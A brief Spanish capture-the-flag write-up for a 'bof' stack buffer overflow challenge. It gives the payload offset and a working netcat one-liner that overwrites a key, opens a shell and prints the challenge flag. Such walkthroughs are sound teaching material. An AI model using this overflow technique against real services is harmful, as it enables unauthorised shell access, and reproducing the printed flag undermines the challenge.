# bof

![bof](https://github.com/user-attachments/assets/9e5bb0b3-fc05-4c17-9b57-ee02c735321f)

Este es un buffer overflow clasico, necesitamos sobreescribir `key` para que la comparacion sea correcta, tambien en `readme` nos dicen que el programa esta corriendo en el puerto 9000 local, debemos explotarlo para encontrar la flag

Si hacemos un breakpoint en `*func+63` veremos que el offset es de 56 bytes (32 del arreglo, 16 que reserva el compilador, 4 de `ebp` y 4 de la direccion de retorno)

![2025-05-05-234246_929x529_scrot](https://github.com/user-attachments/assets/0d0c1380-9d62-4f5c-93cb-4b5b53f3a097)

```
bof@ubuntu:~$ cat readme
bof binary is running at "nc 0 9000" under bof_pwn privilege. get shell and read flag
bof@ubuntu:~$ (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*52+b"\xbe\xba\xfe\xca\n")';cat) | nc 0 9000
ls
bof
bof.c
flag
log
super.pl
cat flag
Daddy_I_just_pwned_a_buff3r!
```

`Daddy_I_just_pwned_a_buff3r!`
